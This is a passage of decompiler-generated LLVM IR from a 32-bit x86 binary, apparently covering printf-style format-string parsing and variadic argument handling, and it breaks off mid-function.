define i32 @function_804c334(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804c334:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c334 = load i32, i32* @esi, align 4
  %v0_804c335 = load i32, i32* @ebx, align 4
  store i32 %v0_804c335, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804c349 = bitcast i32* %arg1 to i8*
  %v4_804c349 = call i32 @function_804ce60(i8* %v3_804c349, i32 0, i32 188)
  store i32 %v4_804c349, i32* %eax.global-to-local, align 4
  %v0_804c34e = load i32, i32* @ebx, align 4
  %v1_804c34e = add i32 %v0_804c34e, 24
  %v2_804c34e = inttoptr i32 %v1_804c34e to i32*
  %v3_804c34e = load i32, i32* %v2_804c34e, align 4
  %v4_804c34e = add i32 %v3_804c34e, -1
  store i32 %v4_804c34e, i32* %v2_804c34e, align 4
  %v0_804c351 = load i32, i32* @esi, align 4
  %v1_804c351 = load i32, i32* @ebx, align 4
  %v2_804c351 = inttoptr i32 %v1_804c351 to i32*
  store i32 %v0_804c351, i32* %v2_804c351, align 4
  %v0_804c353 = load i32, i32* @ebx, align 4
  %v1_804c353 = add i32 %v0_804c353, 40
  store i32 %v1_804c353, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c35e

dec_label_pc_804c35e:                             ; preds = %dec_label_pc_804c35e, %dec_label_pc_804c334
  %v0_804c35e = phi i32 [ %v1_804c364, %dec_label_pc_804c35e ], [ %v1_804c353, %dec_label_pc_804c334 ]
  %v1_804c35e = inttoptr i32 %v0_804c35e to i32*
  store i32 8, i32* %v1_804c35e, align 4
  %v0_804c364 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c364 = add i32 %v0_804c364, 4
  store i32 %v1_804c364, i32* %eax.global-to-local, align 4
  %v0_804c367 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c367 = add i32 %v0_804c367, -1
  %v8_804c367 = icmp eq i32 %v1_804c367, 0
  store i32 %v1_804c367, i32* %edx.global-to-local, align 4
  %v1_804c368 = icmp eq i1 %v8_804c367, false
  br i1 %v1_804c368, label %dec_label_pc_804c35e, label %dec_label_pc_804c36a

dec_label_pc_804c36a:                             ; preds = %dec_label_pc_804c35e
  %v0_804c36a = load i32, i32* @esi, align 4
  store i32 %v0_804c36a, i32* %eax.global-to-local, align 4
  %v1_804c39520 = inttoptr i32 %v0_804c36a to i8*
  %v2_804c39521 = load i8, i8* %v1_804c39520, align 1
  %v3_804c39522 = zext i8 %v2_804c39521 to i32
  %v5_804c39523 = and i32 %v1_804c367, -256
  %v6_804c39524 = or i32 %v3_804c39522, %v5_804c39523
  store i32 %v6_804c39524, i32* %edx.global-to-local, align 4
  %v4_804c39725 = icmp eq i8 %v2_804c39521, 0
  %v1_804c39926 = icmp eq i1 %v4_804c39725, false
  br i1 %v1_804c39926, label %dec_label_pc_804c373, label %dec_label_pc_804c39b

dec_label_pc_804c373:                             ; preds = %dec_label_pc_804c36a, %dec_label_pc_804c395.backedge
  %v6_804c39529 = phi i32 [ %v6_804c395, %dec_label_pc_804c395.backedge ], [ %v6_804c39524, %dec_label_pc_804c36a ]
  %v2_804c39528 = phi i8 [ %v2_804c395, %dec_label_pc_804c395.backedge ], [ %v2_804c39521, %dec_label_pc_804c36a ]
  %v0_804c37827 = phi i32 [ %v0_804c378.be, %dec_label_pc_804c395.backedge ], [ %v0_804c36a, %dec_label_pc_804c36a ]
  %v10_804c373 = icmp eq i8 %v2_804c39528, 37
  %v1_804c376 = icmp eq i1 %v10_804c373, false
  br i1 %v1_804c376, label %dec_label_pc_804c394, label %dec_label_pc_804c378

dec_label_pc_804c378:                             ; preds = %dec_label_pc_804c373
  %v1_804c378 = add i32 %v0_804c37827, 1
  store i32 %v1_804c378, i32* %eax.global-to-local, align 4
  %v1_804c379 = inttoptr i32 %v1_804c378 to i8*
  %v2_804c379 = load i8, i8* %v1_804c379, align 1
  %v11_804c379 = icmp eq i8 %v2_804c379, 37
  br i1 %v11_804c379, label %dec_label_pc_804c394, label %dec_label_pc_804c37e

dec_label_pc_804c37e:                             ; preds = %dec_label_pc_804c378
  %v1_804c381 = load i32, i32* @ebx, align 4
  %v2_804c381 = inttoptr i32 %v1_804c381 to i32*
  store i32 %v1_804c378, i32* %v2_804c381, align 4
  %v0_804c383 = load i32, i32* @ebx, align 4
  %v1_804c384 = inttoptr i32 %v0_804c383 to i32*
  %v2_804c384 = call i32 @function_804c521(i32* %v1_804c384)
  store i32 %v2_804c384, i32* %eax.global-to-local, align 4
  %v2_804c38c = icmp slt i32 %v2_804c384, 0
  br i1 %v2_804c38c, label %dec_label_pc_804c39f, label %dec_label_pc_804c390

dec_label_pc_804c390:                             ; preds = %dec_label_pc_804c37e
  %v0_804c390 = load i32, i32* @ebx, align 4
  %v1_804c390 = inttoptr i32 %v0_804c390 to i32*
  %v2_804c390 = load i32, i32* %v1_804c390, align 4
  %v4_804c395.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c395.backedge

dec_label_pc_804c394:                             ; preds = %dec_label_pc_804c378, %dec_label_pc_804c373
  %v0_804c394 = phi i32 [ %v1_804c378, %dec_label_pc_804c378 ], [ %v0_804c37827, %dec_label_pc_804c373 ]
  %v1_804c394 = add i32 %v0_804c394, 1
  br label %dec_label_pc_804c395.backedge

dec_label_pc_804c395.backedge:                    ; preds = %dec_label_pc_804c394, %dec_label_pc_804c390
  %v4_804c395.be = phi i32 [ %v4_804c395.pre.pre, %dec_label_pc_804c390 ], [ %v6_804c39529, %dec_label_pc_804c394 ]
  %v0_804c378.be = phi i32 [ %v2_804c390, %dec_label_pc_804c390 ], [ %v1_804c394, %dec_label_pc_804c394 ]
  store i32 %v0_804c378.be, i32* %eax.global-to-local, align 4
  %v1_804c395 = inttoptr i32 %v0_804c378.be to i8*
  %v2_804c395 = load i8, i8* %v1_804c395, align 1
  %v3_804c395 = zext i8 %v2_804c395 to i32
  %v5_804c395 = and i32 %v4_804c395.be, -256
  %v6_804c395 = or i32 %v3_804c395, %v5_804c395
  store i32 %v6_804c395, i32* %edx.global-to-local, align 4
  %v4_804c397 = icmp eq i8 %v2_804c395, 0
  %v1_804c399 = icmp eq i1 %v4_804c397, false
  br i1 %v1_804c399, label %dec_label_pc_804c373, label %dec_label_pc_804c395.dec_label_pc_804c39b_crit_edge

dec_label_pc_804c395.dec_label_pc_804c39b_crit_edge: ; preds = %dec_label_pc_804c395.backedge
  %v0_804c39b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c39b

dec_label_pc_804c39b:                             ; preds = %dec_label_pc_804c395.dec_label_pc_804c39b_crit_edge, %dec_label_pc_804c36a
  %v0_804c39b = phi i32 [ %v0_804c39b.pre, %dec_label_pc_804c395.dec_label_pc_804c39b_crit_edge ], [ %v0_804c36a, %dec_label_pc_804c36a ]
  %v1_804c39b = load i32, i32* @ebx, align 4
  %v2_804c39b = inttoptr i32 %v1_804c39b to i32*
  store i32 %v0_804c39b, i32* %v2_804c39b, align 4
  br label %dec_label_pc_804c39f

dec_label_pc_804c39f:                             ; preds = %dec_label_pc_804c37e, %dec_label_pc_804c39b
  %storemerge = phi i32 [ 0, %dec_label_pc_804c39b ], [ -1, %dec_label_pc_804c37e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804c39f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c39f, i32* @edx, align 4
  %v2_804c3a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c3a0, i32* @ebx, align 4
  store i32 %v0_804c334, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804c395, { 1, 0 }
  uselistorder i8 %v2_804c395, { 1, 2, 0 }
  uselistorder i32 %v0_804c378.be, { 2, 1, 0 }
  uselistorder i32 %v0_804c37827, { 1, 0 }
  uselistorder i32 %v0_804c36a, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c367, { 0, 2, 1 }
  uselistorder i32 %v1_804c364, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_804c39f, { 1, 0 }
  uselistorder label %dec_label_pc_804c373, { 1, 0 }
}

define i32 @function_804c3a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804c3a4:
  %stack_var_-12 = alloca i32, align 4
  %v0_804c3a4 = load i32, i32* @esi, align 4
  %v0_804c3a5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c3b1 = add i32 %arg1, 24
  %v2_804c3b1 = inttoptr i32 %v1_804c3b1 to i32*
  %v3_804c3b1 = load i32, i32* %v2_804c3b1, align 4
  %v2_804c3b4 = add i32 %arg1, 76
  %v3_804c3b4 = inttoptr i32 %v2_804c3b4 to i32*
  store i32 %arg2, i32* %v3_804c3b4, align 4
  %tmp8 = icmp slt i32 %v3_804c3b1, 1
  br i1 %tmp8, label %dec_label_pc_804c3e2, label %dec_label_pc_804c3bb

dec_label_pc_804c3bb:                             ; preds = %dec_label_pc_804c3a4
  %v1_804c3be = load i32, i32* @ebx, align 4
  %v2_804c3be = add i32 %v1_804c3be, 28
  %v3_804c3be = inttoptr i32 %v2_804c3be to i32*
  store i32 %v3_804c3b1, i32* %v3_804c3be, align 4
  %v0_804c3c1 = load i32, i32* @ebx, align 4
  %v1_804c3c1 = add i32 %v0_804c3c1, 24
  %v2_804c3c1 = inttoptr i32 %v1_804c3c1 to i32*
  store i32 0, i32* %v2_804c3c1, align 4
  %v0_804c3c8 = load i32, i32* @ebx, align 4
  %v1_804c3c8 = add i32 %v0_804c3c8, 4
  %v2_804c3c8 = inttoptr i32 %v1_804c3c8 to i32*
  store i32 0, i32* %v2_804c3c8, align 4
  %v0_804c3cf = load i32, i32* @ebx, align 4
  %v1_804c3cf = add i32 %v0_804c3cf, 8
  %v2_804c3cf = inttoptr i32 %v1_804c3cf to i32*
  store i32 0, i32* %v2_804c3cf, align 4
  %v0_804c3d6 = load i32, i32* @ebx, align 4
  %v1_804c3d7 = call i32 @function_804c3e8(i32 %v0_804c3d6)
  %v1_804c3dc = load i32, i32* @ebx, align 4
  %v2_804c3dc = add i32 %v1_804c3dc, 24
  %v3_804c3dc = inttoptr i32 %v2_804c3dc to i32*
  store i32 %v3_804c3b1, i32* %v3_804c3dc, align 4
  br label %dec_label_pc_804c3e2

dec_label_pc_804c3e2:                             ; preds = %dec_label_pc_804c3a4, %dec_label_pc_804c3bb
  %v2_804c3e2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804c3a5, i32* @ebx, align 4
  store i32 %v0_804c3a4, i32* @esi, align 4
  ret i32 %v2_804c3e2

; uselistorder directives
  uselistorder i32 %v3_804c3b1, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_804c3e8, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c3e2, { 1, 0 }
}

define i32 @function_804c3e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c3e8:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804c3e9 = load i32, i32* @ebx, align 4
  store i32 %v0_804c3e9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804c3ee = add i32 %arg1, 80
  store i32 %v1_804c3ee, i32* %ebx.global-to-local, align 4
  %v1_804c3f1 = add i32 %arg1, 24
  %v2_804c3f1 = inttoptr i32 %v1_804c3f1 to i32*
  %v3_804c3f1 = load i32, i32* %v2_804c3f1, align 4
  %v4_804c3f1 = icmp eq i32 %v3_804c3f1, 0
  %v1_804c3f5 = icmp eq i1 %v4_804c3f1, false
  %v1_804c4ab = add i32 %arg1, 8
  %v2_804c4ab = inttoptr i32 %v1_804c4ab to i32*
  %v3_804c4ab = load i32, i32* %v2_804c4ab, align 4
  %v8_804c4ab = icmp eq i32 %v3_804c4ab, -2147483648
  %v1_804c4b2 = icmp eq i1 %v8_804c4ab, false
  br i1 %v1_804c3f5, label %dec_label_pc_804c4ab, label %dec_label_pc_804c3fb

dec_label_pc_804c3fb:                             ; preds = %dec_label_pc_804c3e8
  br i1 %v1_804c4b2, label %dec_label_pc_804c415, label %dec_label_pc_804c404

dec_label_pc_804c404:                             ; preds = %dec_label_pc_804c3fb
  %v1_804c404 = add i32 %arg1, 76
  %v2_804c404 = inttoptr i32 %v1_804c404 to i32*
  %v3_804c404 = load i32, i32* %v2_804c404, align 4
  store i32 %v3_804c404, i32* %eax.global-to-local, align 4
  %v1_804c407 = add i32 %v3_804c404, 4
  store i32 %v1_804c407, i32* %edx.global-to-local, align 4
  store i32 %v1_804c407, i32* %v2_804c404, align 4
  %v0_804c40d = load i32, i32* %eax.global-to-local, align 4
  %v1_804c40d = inttoptr i32 %v0_804c40d to i32*
  %v2_804c40d = load i32, i32* %v1_804c40d, align 4
  store i32 %v2_804c40d, i32* %eax.global-to-local, align 4
  %v1_804c40f = load i32, i32* @ecx, align 4
  %v2_804c40f = add i32 %v1_804c40f, 80
  %v3_804c40f = inttoptr i32 %v2_804c40f to i32*
  store i32 %v2_804c40d, i32* %v3_804c40f, align 4
  %v0_804c412 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c412 = load i32, i32* @ecx, align 4
  %v2_804c412 = add i32 %v1_804c412, 8
  %v3_804c412 = inttoptr i32 %v2_804c412 to i32*
  store i32 %v0_804c412, i32* %v3_804c412, align 4
  %v0_804c415.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c415

dec_label_pc_804c415:                             ; preds = %dec_label_pc_804c3fb, %dec_label_pc_804c404
  %v1_804c424 = phi i32 [ %arg1, %dec_label_pc_804c3fb ], [ %v0_804c415.pre, %dec_label_pc_804c404 ]
  %v1_804c415 = add i32 %v1_804c424, 4
  %v2_804c415 = inttoptr i32 %v1_804c415 to i32*
  %v3_804c415 = load i32, i32* %v2_804c415, align 4
  %v8_804c415 = icmp eq i32 %v3_804c415, -2147483648
  %v1_804c41c = icmp eq i1 %v8_804c415, false
  br i1 %v1_804c41c, label %dec_label_pc_804c42f, label %dec_label_pc_804c41e

dec_label_pc_804c41e:                             ; preds = %dec_label_pc_804c415
  %v1_804c41e = add i32 %v1_804c424, 76
  %v2_804c41e = inttoptr i32 %v1_804c41e to i32*
  %v3_804c41e = load i32, i32* %v2_804c41e, align 4
  store i32 %v3_804c41e, i32* %eax.global-to-local, align 4
  %v1_804c421 = add i32 %v3_804c41e, 4
  store i32 %v1_804c421, i32* %edx.global-to-local, align 4
  store i32 %v1_804c421, i32* %v2_804c41e, align 4
  %v0_804c427 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c427 = inttoptr i32 %v0_804c427 to i32*
  %v2_804c427 = load i32, i32* %v1_804c427, align 4
  store i32 %v2_804c427, i32* %eax.global-to-local, align 4
  %v1_804c429 = load i32, i32* @ecx, align 4
  %v2_804c429 = add i32 %v1_804c429, 80
  %v3_804c429 = inttoptr i32 %v2_804c429 to i32*
  store i32 %v2_804c427, i32* %v3_804c429, align 4
  %v0_804c42c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c42c = load i32, i32* @ecx, align 4
  %v2_804c42c = add i32 %v1_804c42c, 4
  %v3_804c42c = inttoptr i32 %v2_804c42c to i32*
  store i32 %v0_804c42c, i32* %v3_804c42c, align 4
  %v1_804c4a417.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c42f

dec_label_pc_804c42f:                             ; preds = %dec_label_pc_804c415, %dec_label_pc_804c41e
  %v1_804c4a417 = phi i32 [ %v1_804c424, %dec_label_pc_804c415 ], [ %v1_804c4a417.pre, %dec_label_pc_804c41e ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804c4a418 = add i32 %v1_804c4a417, 28
  %v3_804c4a419 = inttoptr i32 %v2_804c4a418 to i32*
  %v4_804c4a420 = load i32, i32* %v3_804c4a419, align 4
  %v5_804c4a721 = icmp sgt i32 %v4_804c4a420, 0
  br i1 %v5_804c4a721, label %dec_label_pc_804c433, label %dec_label_pc_804c4d9.loopexit

dec_label_pc_804c433:                             ; preds = %dec_label_pc_804c42f, %dec_label_pc_804c4a3
  %v1_804c4a423 = phi i32 [ %v1_804c4a4, %dec_label_pc_804c4a3 ], [ %v1_804c4a417, %dec_label_pc_804c42f ]
  %v1_804c43322 = phi i32 [ %v1_804c4a3, %dec_label_pc_804c4a3 ], [ 0, %dec_label_pc_804c42f ]
  %v2_804c433 = mul i32 %v1_804c43322, 4
  %v3_804c433 = add i32 %v2_804c433, 40
  %v4_804c433 = add i32 %v3_804c433, %v1_804c4a423
  %v5_804c433 = inttoptr i32 %v4_804c433 to i32*
  %v6_804c433 = load i32, i32* %v5_804c433, align 4
  store i32 %v6_804c433, i32* %eax.global-to-local, align 4
  %v1_804c437 = add i32 %v6_804c433, -8
  %v9_804c437 = icmp eq i32 %v1_804c437, 0
  br i1 %v9_804c437, label %dec_label_pc_804c4a3, label %dec_label_pc_804c43c

dec_label_pc_804c43c:                             ; preds = %dec_label_pc_804c433
  %v10_804c437 = icmp slt i32 %v1_804c437, 0
  %v6_804c437 = sub i32 7, %v6_804c433
  %v7_804c437 = and i32 %v6_804c437, %v6_804c433
  %v8_804c437 = icmp slt i32 %v7_804c437, 0
  %v1_804c43c = add i32 %v1_804c4a423, 76
  %v2_804c43c = inttoptr i32 %v1_804c43c to i32*
  %v3_804c43c = load i32, i32* %v2_804c43c, align 4
  store i32 %v3_804c43c, i32* %edx.global-to-local, align 4
  %v3_804c43f = icmp eq i1 %v10_804c437, %v8_804c437
  br i1 %v3_804c43f, label %dec_label_pc_804c44f, label %dec_label_pc_804c441

dec_label_pc_804c441:                             ; preds = %dec_label_pc_804c43c
  %tmp15 = icmp slt i32 %v6_804c433, 3
  %v9_804c448 = icmp eq i32 %v6_804c433, 7
  %v1_804c44b = icmp eq i1 %v9_804c448, false
  %or.cond = or i1 %tmp15, %v1_804c44b
  br i1 %or.cond, label %dec_label_pc_804c496, label %dec_label_pc_804c478

dec_label_pc_804c44f:                             ; preds = %dec_label_pc_804c43c
  %tmp16 = icmp sgt i32 %v6_804c433, 1024
  br i1 %tmp16, label %dec_label_pc_804c458, label %dec_label_pc_804c496

dec_label_pc_804c458:                             ; preds = %dec_label_pc_804c44f
  %v6_804c458 = icmp eq i32 %v6_804c433, 2048
  br i1 %v6_804c458, label %dec_label_pc_804c468, label %dec_label_pc_804c45f

dec_label_pc_804c45f:                             ; preds = %dec_label_pc_804c458
  %v9_804c45f = icmp eq i32 %v6_804c433, 2055
  %v1_804c464 = icmp eq i1 %v9_804c45f, false
  br i1 %v1_804c464, label %dec_label_pc_804c496, label %dec_label_pc_804c487

dec_label_pc_804c468:                             ; preds = %dec_label_pc_804c458
  %v1_804c468 = add i32 %v3_804c43c, 8
  store i32 %v1_804c468, i32* %eax.global-to-local, align 4
  store i32 %v1_804c468, i32* %v2_804c43c, align 4
  %v0_804c46e = load i32, i32* %edx.global-to-local, align 4
  %v1_804c46e = inttoptr i32 %v0_804c46e to i32*
  %v2_804c46e = load i32, i32* %v1_804c46e, align 4
  store i32 %v2_804c46e, i32* %eax.global-to-local, align 4
  %v1_804c470 = add i32 %v0_804c46e, 4
  %v2_804c470 = inttoptr i32 %v1_804c470 to i32*
  %v3_804c470 = load i32, i32* %v2_804c470, align 4
  store i32 %v3_804c470, i32* %edx.global-to-local, align 4
  %v1_804c473 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c473 = add i32 %v1_804c473, 4
  %v3_804c473 = inttoptr i32 %v2_804c473 to i32*
  store i32 %v3_804c470, i32* %v3_804c473, align 4
  %v0_804c49e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c49e

dec_label_pc_804c478:                             ; preds = %dec_label_pc_804c441
  %v3_804c478 = load i32, i32* %v2_804c43c, align 4
  store i32 %v3_804c478, i32* %edx.global-to-local, align 4
  %v1_804c47b = add i32 %v3_804c478, 8
  store i32 %v1_804c47b, i32* %eax.global-to-local, align 4
  store i32 %v1_804c47b, i32* %v2_804c43c, align 4
  %v0_804c481 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c481 = inttoptr i32 %v0_804c481 to double*
  %v2_804c481 = load double, double* %v1_804c481, align 4
  %v2_804c483 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804c483 = inttoptr i32 %v2_804c483 to double*
  store double %v2_804c481, double* %v4_804c483, align 4
  br label %dec_label_pc_804c4a0

dec_label_pc_804c487:                             ; preds = %dec_label_pc_804c45f
  %v3_804c487 = load i32, i32* %v2_804c43c, align 4
  store i32 %v3_804c487, i32* %edx.global-to-local, align 4
  %v1_804c48a = add i32 %v3_804c487, 12
  store i32 %v1_804c48a, i32* %eax.global-to-local, align 4
  store i32 %v1_804c48a, i32* %v2_804c43c, align 4
  %v0_804c490 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c490 = inttoptr i32 %v0_804c490 to x86_fp80*
  %v2_804c490 = load x86_fp80, x86_fp80* %v1_804c490, align 4
  %v2_804c492 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c492 = inttoptr i32 %v2_804c492 to x86_fp80*
  store x86_fp80 %v2_804c490, x86_fp80* %v3_804c492, align 4
  br label %dec_label_pc_804c4a0

dec_label_pc_804c496:                             ; preds = %dec_label_pc_804c441, %dec_label_pc_804c44f, %dec_label_pc_804c45f
  %v1_804c496 = add i32 %v3_804c43c, 4
  store i32 %v1_804c496, i32* %eax.global-to-local, align 4
  store i32 %v1_804c496, i32* %v2_804c43c, align 4
  %v0_804c49c = load i32, i32* %edx.global-to-local, align 4
  %v1_804c49c = inttoptr i32 %v0_804c49c to i32*
  %v2_804c49c = load i32, i32* %v1_804c49c, align 4
  store i32 %v2_804c49c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c49e

dec_label_pc_804c49e:                             ; preds = %dec_label_pc_804c468, %dec_label_pc_804c496
  %v0_804c49e = phi i32 [ %v0_804c49e.pre, %dec_label_pc_804c468 ], [ %v2_804c49c, %dec_label_pc_804c496 ]
  %v1_804c49e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c49e = inttoptr i32 %v1_804c49e to i32*
  store i32 %v0_804c49e, i32* %v2_804c49e, align 4
  %v0_804c4a0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c4a0

dec_label_pc_804c4a0:                             ; preds = %dec_label_pc_804c487, %dec_label_pc_804c478, %dec_label_pc_804c49e
  %v0_804c4a0 = phi i32 [ %v2_804c492, %dec_label_pc_804c487 ], [ %v2_804c483, %dec_label_pc_804c478 ], [ %v0_804c4a0.pre, %dec_label_pc_804c49e ]
  %v1_804c4a0 = add i32 %v0_804c4a0, 12
  store i32 %v1_804c4a0, i32* %ebx.global-to-local, align 4
  %v0_804c4a3.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804c4a4.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c4a3

dec_label_pc_804c4a3:                             ; preds = %dec_label_pc_804c433, %dec_label_pc_804c4a0
  %v1_804c4a4 = phi i32 [ %v1_804c4a423, %dec_label_pc_804c433 ], [ %v1_804c4a4.pre, %dec_label_pc_804c4a0 ]
  %v0_804c4a3 = phi i32 [ %v1_804c43322, %dec_label_pc_804c433 ], [ %v0_804c4a3.pre, %dec_label_pc_804c4a0 ]
  %v1_804c4a3 = add i32 %v0_804c4a3, 1
  store i32 %v1_804c4a3, i32* %esi.global-to-local, align 4
  %v2_804c4a4 = add i32 %v1_804c4a4, 28
  %v3_804c4a4 = inttoptr i32 %v2_804c4a4 to i32*
  %v4_804c4a4 = load i32, i32* %v3_804c4a4, align 4
  %v5_804c4a7 = icmp slt i32 %v1_804c4a3, %v4_804c4a4
  br i1 %v5_804c4a7, label %dec_label_pc_804c433, label %dec_label_pc_804c4d9.loopexit

dec_label_pc_804c4ab:                             ; preds = %dec_label_pc_804c3e8
  br i1 %v1_804c4b2, label %dec_label_pc_804c4c2, label %dec_label_pc_804c4b4

dec_label_pc_804c4b4:                             ; preds = %dec_label_pc_804c4ab
  %v1_804c4b4 = add i32 %arg1, 36
  %v2_804c4b4 = inttoptr i32 %v1_804c4b4 to i8*
  %v3_804c4b4 = load i8, i8* %v2_804c4b4, align 1
  %v2_804c4b8 = zext i8 %v3_804c4b4 to i32
  %v3_804c4b8 = mul nuw nsw i32 %v2_804c4b8, 12
  store i32 %v3_804c4b8, i32* %eax.global-to-local, align 4
  %v2_804c4bb = add i32 %arg1, 68
  %v3_804c4bb = add i32 %v2_804c4bb, %v3_804c4b8
  %v4_804c4bb = inttoptr i32 %v3_804c4bb to i32*
  %v5_804c4bb = load i32, i32* %v4_804c4bb, align 4
  store i32 %v5_804c4bb, i32* %eax.global-to-local, align 4
  store i32 %v5_804c4bb, i32* %v2_804c4ab, align 4
  %v0_804c4c2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c4c2

dec_label_pc_804c4c2:                             ; preds = %dec_label_pc_804c4ab, %dec_label_pc_804c4b4
  %v1_804c4d6 = phi i32 [ %arg1, %dec_label_pc_804c4ab ], [ %v0_804c4c2.pre, %dec_label_pc_804c4b4 ]
  %v1_804c4c2 = add i32 %v1_804c4d6, 4
  %v2_804c4c2 = inttoptr i32 %v1_804c4c2 to i32*
  %v3_804c4c2 = load i32, i32* %v2_804c4c2, align 4
  %v8_804c4c2 = icmp eq i32 %v3_804c4c2, -2147483648
  %v1_804c4c9 = icmp eq i1 %v8_804c4c2, false
  br i1 %v1_804c4c9, label %dec_label_pc_804c4d9, label %dec_label_pc_804c4cb

dec_label_pc_804c4cb:                             ; preds = %dec_label_pc_804c4c2
  %v1_804c4cb = add i32 %v1_804c4d6, 37
  %v2_804c4cb = inttoptr i32 %v1_804c4cb to i8*
  %v3_804c4cb = load i8, i8* %v2_804c4cb, align 1
  %v2_804c4cf = zext i8 %v3_804c4cb to i32
  %v3_804c4cf = mul nuw nsw i32 %v2_804c4cf, 12
  store i32 %v3_804c4cf, i32* %eax.global-to-local, align 4
  %v1_804c4d2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c4d2 = add nsw i32 %v3_804c4cf, -12
  %v3_804c4d2 = add i32 %v2_804c4d2, %v1_804c4d2
  %v4_804c4d2 = inttoptr i32 %v3_804c4d2 to i32*
  %v5_804c4d2 = load i32, i32* %v4_804c4d2, align 4
  store i32 %v5_804c4d2, i32* %eax.global-to-local, align 4
  store i32 %v5_804c4d2, i32* %v2_804c4c2, align 4
  %v0_804c4d9.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c4d9

dec_label_pc_804c4d9.loopexit:                    ; preds = %dec_label_pc_804c4a3, %dec_label_pc_804c42f
  %v1_804c4a4.lcssa = phi i32 [ %v1_804c4a417, %dec_label_pc_804c42f ], [ %v1_804c4a4, %dec_label_pc_804c4a3 ]
  br label %dec_label_pc_804c4d9

dec_label_pc_804c4d9:                             ; preds = %dec_label_pc_804c4d9.loopexit, %dec_label_pc_804c4c2, %dec_label_pc_804c4cb
  %v10_804c4e0 = phi i32 [ %v1_804c4a4.lcssa, %dec_label_pc_804c4d9.loopexit ], [ %v1_804c4d6, %dec_label_pc_804c4c2 ], [ %v0_804c4d9.pre, %dec_label_pc_804c4cb ]
  %v1_804c4d9 = add i32 %v10_804c4e0, 8
  %v2_804c4d9 = inttoptr i32 %v1_804c4d9 to i32*
  %v3_804c4d9 = load i32, i32* %v2_804c4d9, align 4
  store i32 %v3_804c4d9, i32* %eax.global-to-local, align 4
  %v2_804c4dc = icmp slt i32 %v3_804c4d9, 0
  %v1_804c4de = icmp eq i1 %v2_804c4dc, false
  br i1 %v1_804c4de, label %dec_label_pc_804c4f4, label %dec_label_pc_804c4e0

dec_label_pc_804c4e0:                             ; preds = %dec_label_pc_804c4d9
  %v1_804c4e0 = add i32 %v10_804c4e0, 16
  %v2_804c4e0 = inttoptr i32 %v1_804c4e0 to i32*
  %v3_804c4e0 = load i32, i32* %v2_804c4e0, align 4
  %v4_804c4e0 = or i32 %v3_804c4e0, 8
  store i32 %v4_804c4e0, i32* %v2_804c4e0, align 4
  %v0_804c4e4 = load i32, i32* @ecx, align 4
  %v1_804c4e4 = add i32 %v0_804c4e4, 16
  %v2_804c4e4 = inttoptr i32 %v1_804c4e4 to i32*
  %v3_804c4e4 = load i32, i32* %v2_804c4e4, align 4
  %v4_804c4e4 = and i32 %v3_804c4e4, -2
  store i32 %v4_804c4e4, i32* %v2_804c4e4, align 4
  %v0_804c4e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c4e8 = sub i32 0, %v0_804c4e8
  store i32 %v1_804c4e8, i32* %eax.global-to-local, align 4
  %v1_804c4ea = load i32, i32* @ecx, align 4
  %v2_804c4ea = add i32 %v1_804c4ea, 8
  %v3_804c4ea = inttoptr i32 %v2_804c4ea to i32*
  store i32 %v1_804c4e8, i32* %v3_804c4ea, align 4
  %v0_804c4ed = load i32, i32* @ecx, align 4
  %v1_804c4ed = add i32 %v0_804c4ed, 20
  %v2_804c4ed = inttoptr i32 %v1_804c4ed to i32*
  store i32 32, i32* %v2_804c4ed, align 4
